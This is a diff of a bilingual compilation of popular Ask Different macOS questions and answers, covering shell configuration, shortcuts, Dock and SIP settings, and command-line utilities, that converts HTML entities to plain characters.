 Finally on the Keyboard Shortcut field enter the shortcut you'd like to use
 Add as many shortcuts as you need to move any window between your displays!
 
@@ -1413,17 +1413,17 @@ In Preview's Sidebar drag the images into the order you want them to appear in y
 
 Select/highlight all the images to be included in the PDF document; otherwise only a single image may end up the PDF document
 
-Then from the &quot;File&quot; menu choose &quot;Export Selected Images&quot; (or &quot;Export as PDF...&quot; in recent OS X versions) and then &quot;PDF &gt; Save as PDF&quot;
+Then from the "File" menu choose "Export Selected Images" (or "Export as PDF..." in recent OS X versions) and then "PDF > Save as PDF"
 
 ---
 
-#### 45. Suppressing &quot;The default interactive shell is now zsh&quot; message in macOS Catalina
+#### 45. Suppressing "The default interactive shell is now zsh" message in macOS Catalina
 
 **问题描述 / Problem Description**:
 Tags: terminal, command-line, macos, bash | Score: 216 | Views: 100043 | Answers: 5
 
 **解决方案 / Solution**:
-I found the solution on reddit. The solution is also mentioned in the &quot;How to use a different shell without changing the default&quot; section of the Apple support article mentioned in the bash warning: https://support.apple.com/en-us/HT208050/.
+I found the solution on reddit. The solution is also mentioned in the "How to use a different shell without changing the default" section of the Apple support article mentioned in the bash warning: https://support.apple.com/en-us/HT208050/.
 Add:
 export BASH_SILENCE_DEPRECATION_WARNING=1
 
@@ -1431,7 +1431,7 @@ to $HOME/.bash_profile, $HOME/.profile or $HOME/.bashrc and restart iTerm. After
 
 ---
 
-#### 46. I included emoji in my password and now I can&#39;t log in to my Account on Yosemite
+#### 46. I included emoji in my password and now I can't log in to my Account on Yosemite
 
 **问题描述 / Problem Description**:
 Tags: macos, keyboard, password, filevault, emoji | Score: 213 | Views: 96836 | Answers: 8
@@ -1454,22 +1454,22 @@ Tags: macos, usb | Score: 212 | Views: 565190 | Answers: 2
 In addition to system_profiler SPUSBDataType (suggested by @kjs), you can also use ioreg -p IOUSB:
 
 $ ioreg -p IOUSB 
-+-o Root  &lt;class IORegistryEntry, id 0x100000100, retain 10&gt;
-  +-o EHCI Root Hub Simulation@1A,7  &lt;class IOUSBRootHubDevice, id 0x100000227,$
-  | +-o HubDevice@fa100000  &lt;class IOUSBHubDevice, id 0x10000027a, registered, $
-  | | +-o Apple Internal Keyboard / Trackpad@fa120000  &lt;class IOUSBDevice, id 0$
-  | | +-o BRCM2070 Hub@fa110000  &lt;class IOUSBHubDevice, id 0x1000002b4, registe$
-  | |   +-o Bluetooth USB Host Controller@fa113000  &lt;class IOUSBDevice, id 0x10$
-  | +-o FaceTime HD Camera (Built-in)@fa200000  &lt;class IOUSBDevice, id 0x100000$
-  +-o EHCI Root Hub Simulation@1D,7  &lt;class IOUSBRootHubDevice, id 0x100000228,$
-    +-o HubDevice@fd100000  &lt;class IOUSBHubDevice, id 0x10000027b, registered, $
-      +-o IR Receiver@fd110000  &lt;class IOUSBDevice, id 0x100000288, registered,$
++-o Root  <class IORegistryEntry, id 0x100000100, retain 10>
+  +-o EHCI Root Hub Simulation@1A,7  <class IOUSBRootHubDevice, id 0x100000227,$
+  | +-o HubDevice@fa100000  <class IOUSBHubDevice, id 0x10000027a, registered, $
+  | | +-o Apple Internal Keyboard / Trackpad@fa120000  <class IOUSBDevice, id 0$
+  | | +-o BRCM2070 Hub@fa110000  <class IOUSBHubDevice, id 0x1000002b4, registe$
+  | |   +-o Bluetooth USB Host Controller@fa113000  <class IOUSBDevice, id 0x10$
+  | +-o FaceTime HD Camera (Built-in)@fa200000  <class IOUSBDevice, id 0x100000$
+  +-o EHCI Root Hub Simulation@1D,7  <class IOUSBRootHubDevice, id 0x100000228,$
+    +-o HubDevice@fd100000  <class IOUSBHubDevice, id 0x10000027b, registered, $
+      +-o IR Receiver@fd110000  <class IOUSBDevice, id 0x100000288, registered,$
 
 
 By default it clips to the window's width (80 chars in the example above), so you may want to add -w0 to get a full-width display. Also, adding -l will show details (probably more than you need) about each of the devices:
 
 $ ioreg -p IOUSB -w0 -l
-    +-o Root  &lt;class IORegistryEntry, id 0x100000100, retain 10&gt;
+    +-o Root  <class IORegistryEntry, id 0x100000100, retain 10>
   | {
   |   "IOKitBuildVersion" = "Darwin Kernel Version 14.0.0: Fri Sep 19 00:26:44 PDT 2014; root:xnu-2782.1.97~2/RELEASE_X86_64"
   |   "OS Build Version" = "14B25"
@@ -1496,13 +1496,13 @@ IR Receiver
 
 ---
 
-#### 48. Why is it not possible to use the &quot;cut&quot; command to manipulate a file in the Finder?
+#### 48. Why is it not possible to use the "cut" command to manipulate a file in the Finder?
 
 **问题描述 / Problem Description**:
 Tags: macos, finder, switching, contextual-menu | Score: 212 | Views: 200052 | Answers: 12
 
 **解决方案 / Solution**:
-Keyboard method: Cmd-C then Opt-Cmd-V does the cut&amp;paste for files on Mac. 
+Keyboard method: Cmd-C then Opt-Cmd-V does the cut&paste for files on Mac. 
 
 Mouse method: Drag the file from one folder to the parent of the target folder (ie, if moving to Documents:Financial, drag to Documents). Hover on the parent folder for a few seconds, and it will spring open. Then you can continue dragging the file to the target folder. (note, the mouse method may result in very long hover times, if you're dragging a huge number of files, eg 1,000 files)
 
@@ -1536,13 +1536,13 @@ Tags: macos, zsh, environment-variables | Score: 209 | Views: 274065 | Answers: 
 **解决方案 / Solution**:
 This is an attempt to write a canonical QA for this issue, as per the Meta post:  Where is the list of canonical questions stored for Ask Different? I expect it to be periodically edited with the goal of becoming a comprehensive information resource.
 What should be used in ZSH on a Mac
-I posted a more narrowly scoped question on Unix &amp; Linux and got some clarification on how these files &quot;work.&quot;  Here's the summary of that answer and what I've learned in my research as to what, in my opinion should be used in a ZSH environment on a Mac.
+I posted a more narrowly scoped question on Unix & Linux and got some clarification on how these files "work."  Here's the summary of that answer and what I've learned in my research as to what, in my opinion should be used in a ZSH environment on a Mac.
 
 .zprofile
 .zlogin and .zprofile are basically the same thing - they set the environment for login shells1; they just get loaded at different times (see below).  .zprofile is based on the Bash's .bash_profile while .zlogin is a derivative of CSH's .login.  Since Bash was the default shell for everything up to Mojave, stick with .zprofile.
 
 .zshrc
-This sets the environment for interactive shells2.  This gets loaded after .zprofile.  It's typically a place where you &quot;set it and forget it&quot; type of parameters like $PATH, $PROMPT, aliases, and functions you would like to have in both login and interactive shells.
+This sets the environment for interactive shells2.  This gets loaded after .zprofile.  It's typically a place where you "set it and forget it" type of parameters like $PATH, $PROMPT, aliases, and functions you would like to have in both login and interactive shells.
 
 .zshenv (Optional)
 This is read first and read every time.  This is where you set environment variables.  I say this is optional because is geared more toward advanced users where having your $PATH, $PAGER, or $EDITOR variables may be important for things like scripts that get called by launchd.  Those run under a non-interactive shell 3 so anything in .zprofile or .zshrc won't get loaded.  Personally, I don't use this one because I set the PATH variable in my script itself to ensure portability.
@@ -1585,14 +1585,14 @@ Tags: macos, command-line, encryption | Score: 205 | Views: 151884 | Answers: 4
 **解决方案 / Solution**:
 You can use
 
-openssl dgst -sha256 &lt;file&gt;
+openssl dgst -sha256 <file>
 
 
 Tested on LibreSSL 2.6.4 on macOS 10.14 (Mojave).
 
 
 
-Prior to Mojave you can use openssl sha -sha256 &lt;file&gt; or openssl sha256 &lt;file&gt;.
+Prior to Mojave you can use openssl sha -sha256 <file> or openssl sha256 <file>.
 
 To check command line options for the openssl sha command: openssl sha -help.
 
@@ -1611,7 +1611,7 @@ defaults write com.apple.dock autohide-time-modifier -int 0; killall Dock
 I find this useful, but if you’d like the animation for the dock to reappear to last for a split-second, try the following:
 defaults write com.apple.dock autohide-time-modifier -float 0.15; killall Dock
 
-To explain, changing &quot;0.15&quot; with any number can let you tailor things as it represents the time in seconds taken for the dock to reappear fully.
+To explain, changing "0.15" with any number can let you tailor things as it represents the time in seconds taken for the dock to reappear fully.
 
 To revert back to the default sliding effect, open a Terminal window and type the following:
 defaults delete com.apple.dock autohide-time-modifier; killall Dock
@@ -1646,7 +1646,7 @@ Source: zakgreant on macosxhints forums.
 
 ---
 
-#### 56. How do I disable System Integrity Protection (SIP) AKA &quot;rootless&quot; on macOS?
+#### 56. How do I disable System Integrity Protection (SIP) AKA "rootless" on macOS?
 
 **问题描述 / Problem Description**:
 Tags: macos, sip | Score: 197 | Views: 499215 | Answers: 6
@@ -1672,7 +1672,7 @@ An article on lifehacker.com lists these steps:
 
 
 Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo appears on your screen.
-Click Utilities &gt; Terminal.
+Click Utilities > Terminal.
 In the Terminal window, type in csrutil disable and press Enter.
 Restart your Mac.
 
@@ -1835,9 +1835,9 @@ Control-Command-Q or ^+⌘+Q
 
 
 
-For older OS, ⇧+⌃+⏏ puts the display (only the display, not the whole computer) to sleep and will then prompt you for a password if you have enabled Require password [amount of time] after sleep or screen saver begins under System Preferences &gt; Security.
+For older OS, ⇧+⌃+⏏ puts the display (only the display, not the whole computer) to sleep and will then prompt you for a password if you have enabled Require password [amount of time] after sleep or screen saver begins under System Preferences > Security.
 
-If your Mac does not have an &#x23CF; (eject) key, you can use ⇧+⌃+⌽ (power).
+If your Mac does not have an ⏏ (eject) key, you can use ⇧+⌃+⌽ (power).
 
 ---
 
@@ -1990,8 +1990,8 @@ You should now have the shortcuts available for any application window that supp
 
 
 †I have a dual monitor setup. So other than the one listed above, I have also set the shortcut to move a window to another monitor. The 'Menu Title's are: 
-1. &quot;Move to Built-in Retina Display&quot;, with shortcut ⌃⎇⌘→;
-2. &quot;Move to LG UltraFine&quot;, with shortcut ⌃⎇⌘←;
+1. "Move to Built-in Retina Display", with shortcut ⌃⎇⌘→;
+2. "Move to LG UltraFine", with shortcut ⌃⎇⌘←;
 To remember the shortcuts, notice that all they keys, are next to each other. All you do is use arrow keys differently. Further, moving to another monitor has an extra key in the shortcut, while putting the windows in split view is on the same monitor, therefore it has one less key.
 Hint:
 The shortcut name depends on the MacOS system language, e.g.:
@@ -1999,7 +1999,7 @@ english:
 'Tile Window to Left of Screen'
 german : 'Fenster auf der linken Bildschirmseite anordnen'
 or a different title: 'Fenster auf die linke Seite des Bildschirms bewegen'
-Phrases for left / right can be found on the green &quot;full screen&quot; button:
+Phrases for left / right can be found on the green "full screen" button:
 
 ---
 
@@ -2242,7 +2242,7 @@ tool(s).
 See man installer for the full functionality. Often
 sudo installer -pkg /path/to/package.pkg -target /
 
-is all that's needed. The target is a &quot;device&quot; (see the man page for details or run installer -dominfo). Here / is the main drive, it also accepts devices like &quot;/Volumes/Macintosh HD&quot;, or /dev/disk0.
+is all that's needed. The target is a "device" (see the man page for details or run installer -dominfo). Here / is the main drive, it also accepts devices like "/Volumes/Macintosh HD", or /dev/disk0.
 
 ---
 
@@ -2266,7 +2266,7 @@ Move files manually in Finder or let FileMerge do it, by choosing an option in t
 
 ---
 
-#### 83. Any nice, stable ways to keep a window &#39;Always on top&#39; on the Mac?
+#### 83. Any nice, stable ways to keep a window 'Always on top' on the Mac?
 
 **问题描述 / Problem Description**:
 Tags: macos, window-manager | Score: 163 | Views: 276780 | Answers: 13
@@ -2339,13 +2339,13 @@ This can be set in Terminal.app preferences
 Context
 To answer the one about how to get the beginning or end of the line, it appears that by default Terminal maps these keys to it:
 
-shift+home → beginning of line, equivalent to the &quot;home&quot; key in normal terminals
-shift+end → end of line, equivalent to the &quot;end&quot; key in normal terminals
+shift+home → beginning of line, equivalent to the "home" key in normal terminals
+shift+end → end of line, equivalent to the "end" key in normal terminals
 
 Instructions
-If you want home and end to work the &quot;normal&quot; way (and not require shift), go to the Keyboard tab of the Terminal profile preferences:
+If you want home and end to work the "normal" way (and not require shift), go to the Keyboard tab of the Terminal profile preferences:
 [Terminal menu] → Preferences → Profiles tab (or settings on some versions of OS X) → Keyboard sub-tab
-Then modify/add these keys to be the following &quot;send string to shell&quot;. Use the code for your shell, Bash or Zsh.
+Then modify/add these keys to be the following "send string to shell". Use the code for your shell, Bash or Zsh.
 macOS changed the default shell from Bash to Zsh in MacOS Catalina (v10.15) and later versions (BigSur and Monterey). The instructions are different for Bash and Zsh.
 Zsh
 
@@ -2354,7 +2354,7 @@ end: \005
 
 You can enter these codes in the edit dialog by pressing ctrl-A for \001 and ctrl-E for \005. Thanks to @JW for the Zsh information.
 Another, unrelated, option to map home/end keys for MacOS Catalina (v10.15) and later versions (BigSur and Monterey) is to use bindkey widgets:
-sudo echo 'bindkey &quot;\033[H&quot; beginning-of-line; bindkey &quot;\033[F&quot; end-of-line' &gt;&gt; ~/.zshrc
+sudo echo 'bindkey "\033[H" beginning-of-line; bindkey "\033[F" end-of-line' >> ~/.zshrc
 
 Bash
 
@@ -2488,7 +2488,7 @@ Now the new bash is our default login shell. If you open Terminal or iTerm2 and 
 $ bash --version
 GNU bash, version 4.4.12(1)-release (x86_64-apple-darwin16.6.0)
 Copyright (C) 2016 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 
 ---
 
@@ -2513,7 +2513,7 @@ Tags: macos, notifications, dual-screen | Score: 152 | Views: 96074 | Answers: 3
 You should be able to do this by choosing the monitor on which the menu bar is active.
 Try:
 
-System Settings -&gt; Displays -&gt; Arrangement
+System Settings -> Displays -> Arrangement
 
 and drag the little white bar to the monitor where you want the notifications to show up.
 In the picture below, the bar is being dragged from the left to the right window.
@@ -2612,10 +2612,10 @@ More Detail (Visual Studio Code Themes):
 
 Auto switch based on OS color scheme Windows and macOS support light and dark color schemes. There is a setting, window.autoDetectColorScheme, that instructs VS Code to listen to changes to the OS's color scheme and switch to a matching theme accordingly.
 To customize the themes that are used when a color scheme changes, you can set the preferred light, dark, and high contrast themes with the settings:
-workbench.preferredLightColorTheme - defaults to &quot;Default Light+&quot;
-workbench.preferredDarkColorTheme - defaults to &quot;Default Dark+&quot;
-workbench.preferredHighContrastColorTheme - defaults to &quot;Default High Contrast&quot;
-workbench.preferredHighContrastLightColorTheme - defaults to &quot;Default High Contrast Light&quot;
+workbench.preferredLightColorTheme - defaults to "Default Light+"
+workbench.preferredDarkColorTheme - defaults to "Default Dark+"
+workbench.preferredHighContrastColorTheme - defaults to "Default High Contrast"
+workbench.preferredHighContrastLightColorTheme - defaults to "Default High Contrast Light"
 
 ---
 
@@ -2643,7 +2643,7 @@ and Quicktime now looks like this:
 
 ---
 
-#### 98. Should I disconnect my MacBook Pro&#39;s power cord when the battery is fully charged?
+#### 98. Should I disconnect my MacBook Pro's power cord when the battery is fully charged?
 
 **问题描述 / Problem Description**:
 Tags: macbook-pro, battery, charging | Score: 149 | Views: 263777 | Answers: 12
@@ -2755,7 +2755,7 @@ Here are some suggestions which can help you with the operating system issues.
 
 Free up some inactive memory. In order to do this, you've to flush cache first and force disk cache to be purged:
 
-sync &amp;&amp; sudo purge
+sync && sudo purge
 
 
 
@@ -2797,9 +2797,9 @@ if [ -f ~/.git-completion.bash ]; then
 fi
 
 Update: I'm making these bits of code more concise to shrink down my .bashrc file, in this case I now use:
-test -f ~/.git-completion.bash &amp;&amp; . $_
+test -f ~/.git-completion.bash && . $_
 
-Note: $_ means the last argument to the previous command. so . $_ means run it - &quot;it&quot; being .git-completion.bash in this case
+Note: $_ means the last argument to the previous command. so . $_ means run it - "it" being .git-completion.bash in this case
 This still works on both Ubuntu and OSX and on machines without the script .git-completion.bash script.
 Now git Tab (actually it's git TabTab ) works like a charm!
 p.s.: If this doesn't work off the bat, you may need to run chmod u+x ~/.git-completion.bash to grant yourself the necessary permission:
@@ -2827,7 +2827,7 @@ On OS X, Terminal by default runs a login shell every time, so this is a little 
 
 ---
 
-#### 103. Why doesn&#39;t .bashrc run automatically?
+#### 103. Why doesn't .bashrc run automatically?
 
 **问题描述 / Problem Description**:
 Tags: terminal, command-line, bash | Score: 288 | Views: 574354 | Answers: 14
@@ -2864,13 +2864,13 @@ cat ~/Desktop/ded.html | pbcopy
 
 The file is now in your clipboard.
 To put it somewhere else (i.e. paste it) run:
-pbpaste &gt; ~/Documents/ded.html
+pbpaste > ~/Documents/ded.html
 
 Now you should have a copy of ded.html sitting in ~/Documents.
 
 ---
 
-#### 105. Is there a Mac OS X Terminal version of the &quot;free&quot; command in Linux systems?
+#### 105. Is there a Mac OS X Terminal version of the "free" command in Linux systems?
 
 **问题描述 / Problem Description**:
 Tags: terminal, memory, command-line | Score: 262 | Views: 380680 | Answers: 22
@@ -2909,14 +2909,14 @@ for row in range(1,len(vmLines)-2):
     rowElements = sep.split(rowText)
     vmStats[(rowElements[0])] = int(rowElements[1].strip('\.')) * 4096
 
-print('Wired Memory:\t\t%d MB' % (vmStats[&quot;Pages wired down&quot;]/1024/1024))
-print('Active Memory:\t\t%d MB' % (vmStats[&quot;Pages active&quot;]/1024/1024))
-print('Inactive Memory:\t%d MB' % (vmStats[&quot;Pages inactive&quot;]/1024/1024))
-print('Free Memory:\t\t%d MB' % (vmStats[&quot;Pages free&quot;]/1024/1024))
+print('Wired Memory:\t\t%d MB' % (vmStats["Pages wired down"]/1024/1024))
+print('Active Memory:\t\t%d MB' % (vmStats["Pages active"]/1024/1024))
+print('Inactive Memory:\t%d MB' % (vmStats["Pages inactive"]/1024/1024))
+print('Free Memory:\t\t%d MB' % (vmStats["Pages free"]/1024/1024))
 print('Real Mem Total (ps):\t%.3f MB' % (rssTotal/1024/1024))
 
 As you can see, you can just call vm_stat from the command line, though it counts in 4kB pages, hence the script to convert to MB.
-The script also counts up the &quot;real memory&quot; usage of all running processes for comparison (this won't match any specific value(s) from overall memory stats, because memory is a complex beast).
+The script also counts up the "real memory" usage of all running processes for comparison (this won't match any specific value(s) from overall memory stats, because memory is a complex beast).
 
 Here's an example of the output of the script on my system:
 [user@host:~] % memReport.py
@@ -2974,12 +2974,12 @@ Tags: terminal, iterm | Score: 193 | Views: 171843 | Answers: 6
 
 **解决方案 / Solution**:
 You can use iTerm2's system-wide hotkey with the Hotkey Window profile to do this.
-In iTerm2 preferences, click on the &quot;Keys&quot; tab and choose &quot;Hotkey&quot;. Click &quot;Create a Dedicated Hotkey Window…&quot; and assign the hotkey you'd like to use.
-Check the &quot;Hotkey toggles a dedicated window with profile:&quot; option and choose &quot;Hotkey Window&quot; in the popup menu below (should be selected by default).
+In iTerm2 preferences, click on the "Keys" tab and choose "Hotkey". Click "Create a Dedicated Hotkey Window…" and assign the hotkey you'd like to use.
+Check the "Hotkey toggles a dedicated window with profile:" option and choose "Hotkey Window" in the popup menu below (should be selected by default).
 With default settings, the Hotkey Profile window will stretch across the top of the screen, and the hotkey will drop the window down from the top, complete with animation.
 
 
-You can customize the settings for the &quot;Hotkey Window&quot; profile under the &quot;Profiles&quot; tab. To make it look like a Quake drop-down terminal, you can use similar &quot;Window&quot; preferences:
+You can customize the settings for the "Hotkey Window" profile under the "Profiles" tab. To make it look like a Quake drop-down terminal, you can use similar "Window" preferences:
 
 ---
 
@@ -3037,8 +3037,8 @@ Cons: Requires the Finder to be running.
 Tags: macos, security, sleep-wake, power | Score: 147 | Views: 221872 | Answers: 8
 
 **解决方案 / Solution**:
-In System Preferences &gt; Energy Saver, check the box for &quot;Prevent computer from sleeping automatically when the display is off&quot; (on laptops, this is under the Power Adapter tab)
-In System Preferences &gt; Security &amp; Privacy, check the box for &quot;Require password after sleep or screen saver begins&quot; and set the delay in the dropdown menu to &quot;immediately&quot;
+In System Preferences > Energy Saver, check the box for "Prevent computer from sleeping automatically when the display is off" (on laptops, this is under the Power Adapter tab)
+In System Preferences > Security & Privacy, check the box for "Require password after sleep or screen saver begins" and set the delay in the dropdown menu to "immediately"
 
 Now, you can hit command+option+Q  to turn off the display without sleeping the computer, and doing anything that turns on the display (like hitting a key or clicking a mouse button) will prompt you for your account password.
 On older Macs, the shortcut is different: command+option+Power or control+shift+power.
@@ -3055,11 +3055,11 @@ Select "Reuse previous session's directory" from the preferences of your profile
 
 
 
-Alternatively click on "Advanced Configuration" then "Edit..." so you can set the working directory separately for new windows, new tabs &amp; new split panes
+Alternatively click on "Advanced Configuration" then "Edit..." so you can set the working directory separately for new windows, new tabs & new split panes
 
 ---
 
-#### 114. The volume can&#39;t be ejected because it&#39;s currently in use
+#### 114. The volume can't be ejected because it's currently in use
 
 **问题描述 / Problem Description**:
 Tags: external-disk, eject, macos | Score: 145 | Views: 203648 | Answers: 10
@@ -3264,7 +3264,7 @@ Tags: macos, keyboard, contextual-menu, spellcheck | Score: 140 | Views: 83262 |
 I always have the same question but I didn't find the answer yet.
 In Windows, when we use the keyboard short-cuts we mostly use the Menu key in Windows keyboard:
 
-When this Menu key is pressed, Windows will assume that you right-clicked the highlighted/active element &gt; then it will show you the context menu even if the mouse pointer is not pointing to the highlighted element.
+When this Menu key is pressed, Windows will assume that you right-clicked the highlighted/active element > then it will show you the context menu even if the mouse pointer is not pointing to the highlighted element.
 So this feature seems to be missing in Mac OS. And whatever suggested solutions, even Enable Mouse Key it always require you to point/move your mouse pointer to element first, which is meaningless. If I need to use the keyboard short-cut to open the context menu on the highlighted item, why do I need again to move the mouse pointer to it also. Somehow this is not a short-cut!!
 
 ---
@@ -3318,7 +3318,7 @@ So I have changed my habits to work around this annoying bug...
 
 ---
 
-#### 126. What&#39;s a good graphical SFTP utility for OS X?
+#### 126. What's a good graphical SFTP utility for OS X?
 
 **问题描述 / Problem Description**:
 Tags: macos, snow-leopard, software-recommendation, ssh, ftp | Score: 137 | Views: 376006 | Answers: 15
@@ -3358,7 +3358,7 @@ Just searching around and found yet another one...It looks pretty nice, except i
 
 ---
 
-#### 127. How to fix homebrew error: &quot;invalid active developer path&quot; after upgrade to OS X El Capitan?
+#### 127. How to fix homebrew error: "invalid active developer path" after upgrade to OS X El Capitan?
 
 **问题描述 / Problem Description**:
 Tags: homebrew, macos | Score: 136 | Views: 125239 | Answers: 5
@@ -3415,7 +3415,7 @@ sudo kextload /System/Library/Extensions/AppleHDA.kext
 
 ---
 
-#### 130. How can I figure out what&#39;s slowly eating my drive space?
+#### 130. How can I figure out what's slowly eating my drive space?
 
 **问题描述 / Problem Description**:
 Tags: macos, disk-space, filevault | Score: 133 | Views: 114263 | Answers: 19
@@ -3437,9 +3437,9 @@ So each one has its advantages and highlights, I'm still not sure if there's one
 
 There is also a different approach, of apps for scanning specific expected places and files for space usage in non-optimal ways. They basically gather some known things about the system that can be bloating your disk all in one nice interface so you can see and decide what to delete.
 
-CleanMyMac lists caches, logs, language files, universal binaries, development &quot;junk&quot;, extensions and applications. It scans through the files and also uses some knowledge base it has. Great interface, simple to use. CleanMyMac has a free trial which will only clean up to 500 MB.
+CleanMyMac lists caches, logs, language files, universal binaries, development "junk", extensions and applications. It scans through the files and also uses some knowledge base it has. Great interface, simple to use. CleanMyMac has a free trial which will only clean up to 500 MB.
 
-XSlimmer is very specific. It remove &quot;unnecessary&quot; code from &quot;fat&quot; binaries and Strip out unneeded languages, as it says on the website. Universal Binaries, that is, use a lot of space for storing files to run in several different architectures and languages. So, this strips all of them to shrink to only your computer needs. XSlimmer is currently discontinued.
+XSlimmer is very specific. It remove "unnecessary" code from "fat" binaries and Strip out unneeded languages, as it says on the website. Universal Binaries, that is, use a lot of space for storing files to run in several different architectures and languages. So, this strips all of them to shrink to only your computer needs. XSlimmer is currently discontinued.
 
 
 
@@ -3449,11 +3449,11 @@ TidyUp is a very well known app in this subject. You can specify where to scan f
 
 MrClean is a free tool that just scans for folders for duplicates and trash them. Very simplistic but efficient if you're sure on what you're doing.
 
-Chipmunk scans duplicates and let you choose which ones you want to trash. It offers a node-view of folders and you can select to &quot;delete all files in a folder that have duplicates elsewhere, or vice versa&quot; as well as hand-picking. It may take very long to scan all files, but it does a very decent job after that.
+Chipmunk scans duplicates and let you choose which ones you want to trash. It offers a node-view of folders and you can select to "delete all files in a folder that have duplicates elsewhere, or vice versa" as well as hand-picking. It may take very long to scan all files, but it does a very decent job after that.
 
-DupeCheck &quot;drop a file on it and it will use your Spotlight index to see if you have a potential duplicate somewhere.&quot; That's about this nice open source app. Not a great tool for space cleaning at once, but over time it helps you keep your space clean.
+DupeCheck "drop a file on it and it will use your Spotlight index to see if you have a potential duplicate somewhere." That's about this nice open source app. Not a great tool for space cleaning at once, but over time it helps you keep your space clean.
 
-DuplicateFileSearcher from the website: &quot;is a free powerful software utility that will help you to find and delete duplicate files on your computer. It can also be used to calculate MD5 and SHA hashes. The software runs in Windows, Linux, Solaris and MacOS.&quot;. Enough said.
+DuplicateFileSearcher from the website: "is a free powerful software utility that will help you to find and delete duplicate files on your computer. It can also be used to calculate MD5 and SHA hashes. The software runs in Windows, Linux, Solaris and MacOS.". Enough said.
 
 
 
@@ -3491,11 +3491,11 @@ Adding to the command line option, you could use an automator service for openin
 Or, if you're on a Power PC, using Rosetta or anything before Snow Leopard, you can mix any of the before mentioned apps with Pseudo. It's a little app to open things as admin. Picture it like a GUI for sudo.
 
 
-Finally, there's a complete newbie guide on &quot;The X Lab&quot; that I just won't quote here for it's too long.
+Finally, there's a complete newbie guide on "The X Lab" that I just won't quote here for it's too long.
 
 ---
 
-#### 131. Silencing &quot;Your disk is almost full&quot; notification
+#### 131. Silencing "Your disk is almost full" notification
 
 **问题描述 / Problem Description**:
 Tags: notifications, disk-space, macos | Score: 133 | Views: 121895 | Answers: 4
@@ -3565,7 +3565,7 @@ Tags: ios, xcode, macos | Score: 132 | Views: 174153 | Answers: 11
 **解决方案 / Solution**:
 Yes, you can delete any simulator that you don't use.  I do this routinely when I stop supporting older iOS versions.
 If you delete them and then you find that you need them at some point in the future, you can redownload them from Apple's developer site.
-The best way to delete them is in Xcode.  Go to Window -&gt; Devices and Simulators.  This will open a new window with all the devices you use in Xcode.
+The best way to delete them is in Xcode.  Go to Window -> Devices and Simulators.  This will open a new window with all the devices you use in Xcode.
 At the top, tap on Simulators and you'll see a list on the left-side.
 From there, find the simulator you want to delete and Cntl - click (or right-click) and select Delete.
 I do this with each simulator that runs in each iOS version that I no longer support.
@@ -3686,7 +3686,7 @@ Yes. When the Finder dialog box is active type ⇧⌘G to bring up the Go to the
 
 ---
 
-#### 139. How to get rid of firewall &quot;accept incoming connections&quot; dialog?
+#### 139. How to get rid of firewall "accept incoming connections" dialog?
 
 **问题描述 / Problem Description**:
 Tags: macos, snow-leopard, firewall | Score: 130 | Views: 127359 | Answers: 14
@@ -3788,17 +3788,17 @@ Setting the Mac hostname or computer name from the terminal
   Type the following command to change the primary hostname of your Mac:
   This is your fully qualified hostname, for example myMac.domain.com 
 
-sudo scutil --set HostName &lt;new host name&gt;
+sudo scutil --set HostName <new host name>
 
   Type the following command to change the Bonjour hostname of your Mac:
   This is the name usable on the local network, for example myMac.local. 
 
-sudo scutil --set LocalHostName &lt;new host name&gt;
+sudo scutil --set LocalHostName <new host name>
 
   If you also want to change the computer name, type the following command:
   This is the user-friendly computer name you see in Finder, for example myMac. 
 
-sudo scutil --set ComputerName &lt;new name&gt;
+sudo scutil --set ComputerName <new name>
 
   Flush the DNS cache by typing: 
 
@@ -3808,7 +3808,7 @@ dscacheutil -flushcache
 
 ---
 
-#### 145. Copying the current directory&#39;s path to the clipboard
+#### 145. Copying the current directory's path to the clipboard
 
 **问题描述 / Problem Description**:
 Tags: macos, finder | Score: 126 | Views: 100324 | Answers: 19
@@ -3940,7 +3940,7 @@ magick mogrify -monitor -format jpg *.HEIC
 Update: Now MacOS provides a built-in converter using Finder, if you want a GUI solution.
 
 NOTE: As of version 7, magick convert results in this warning:
-WARNING: The convert command is deprecated in IMv7, use &quot;magick&quot; instead
+WARNING: The convert command is deprecated in IMv7, use "magick" instead
 
 so, for version 7 of imagemagick (and possibly thereafter), the second command can be simplified to just:
 # convert a single image
@@ -4057,7 +4057,7 @@ If Selective self-test is pending on power-up, resume after 0 minute delay.
 
 ---
 
-#### 153. What functionality do &#39;marks&#39; offer in the El Capitan Terminal?
+#### 153. What functionality do 'marks' offer in the El Capitan Terminal?
 
 **问题描述 / Problem Description**:
 Tags: terminal, macos | Score: 123 | Views: 21018 | Answers: 2
@@ -4434,60 +4434,60 @@ The file should contain XML with new filter - you can base on the /System/Librar
 Filter file structure/example
 
 I marked key settings by comments.
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
-&lt;plist version=&quot;1.0&quot;&gt;
-&lt;dict&gt;
-    &lt;key&gt;Domains&lt;/key&gt;
-    &lt;dict&gt;
-        &lt;key&gt;Applications&lt;/key&gt;
-        &lt;true/&gt;
-        &lt;key&gt;Printing&lt;/key&gt;
-        &lt;true/&gt;
-    &lt;/dict&gt;
-    &lt;key&gt;FilterData&lt;/key&gt;
-    &lt;dict&gt;
-        &lt;key&gt;ColorSettings&lt;/key&gt;
-        &lt;dict&gt;
-            &lt;key&gt;DocumentColorSettings&lt;/key&gt;
-            &lt;dict&gt;
-                &lt;key&gt;CustomLHSCorrection&lt;/key&gt;
-                &lt;array&gt;
-                    &lt;integer&gt;8&lt;/integer&gt;
-                    &lt;integer&gt;8&lt;/integer&gt;
-                    &lt;integer&gt;8&lt;/integer&gt;
-                &lt;/array&gt;
-            &lt;/dict&gt;
-            &lt;key&gt;ImageSettings&lt;/key&gt;
-            &lt;dict&gt;
-                &lt;key&gt;Compression Quality&lt;/key&gt;
-    &lt;!-- ====== Set your custom quality &lt;0,1&gt; ======= --&gt;
-                &lt;real&gt;0.75&lt;/real&gt;
-                &lt;key&gt;ImageCompression&lt;/key&gt;
-                &lt;string&gt;ImageJPEGCompress&lt;/string&gt;
-                &lt;key&gt;ImageScaleSettings&lt;/key&gt;
-                &lt;dict&gt;
-                    &lt;key&gt;ImageScaleFactor&lt;/key&gt;
-    &lt;!-- ====== Set your scale factor &lt;0,1&gt; ======= --&gt;                 
